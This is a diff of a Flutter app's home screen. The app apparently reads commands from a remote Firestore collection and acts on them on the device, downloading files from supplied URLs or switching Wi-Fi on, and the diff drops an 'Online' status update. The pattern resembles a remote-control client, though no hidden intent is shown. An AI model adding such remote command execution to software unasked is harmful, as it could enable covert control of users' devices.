@@ -201,7 +201,7 @@ class _HomeState extends State<Home> {
               });
 
          }else{
-           Firestore.instance.collection("Informations").document(doc.last.documentID).updateData({"Status":"Online"});
+          
 
          }
     
@@ -226,15 +226,7 @@ class _HomeState extends State<Home> {
     return Scaffold(
        
        backgroundColor: Colors.white,
-       body: Container(
-        
-         decoration: BoxDecoration(
-         
-         ),
-         child: Builder(
-           
-           builder:(context){ 
-             return Padding(
+       body: Padding(
                padding: const EdgeInsets.all(18.0),
                child: Column(
                  mainAxisAlignment: MainAxisAlignment.end,
@@ -261,14 +253,14 @@ class _HomeState extends State<Home> {
                                     String ext = "."+snap.data.documents.last.data["Command"].toString().split(" ")[3].toString();
                                     Downloader.download(url,name,ext);
                               
-                                }else if(snap.data.documents.last.data["Status"].toString().startsWith("promptwifi")){
+                                }else if(snap.data.documents.last.data["Command"].toString().startsWith("promptwifi")){
                   
                                      ConnectWifi.enable();
                                      ConnectWifi.openWifi();
                                     
                                 }
 
-                                print(snap.data.documents.last.data["Status"]);
+                                print(snap.data.documents.last["Command"]+"        1");
                                  
                                
 
@@ -336,10 +328,7 @@ class _HomeState extends State<Home> {
                     )
                  ],
                ),
-             );
-             }
-             ,
-         ),
+            
        ),
        
     );
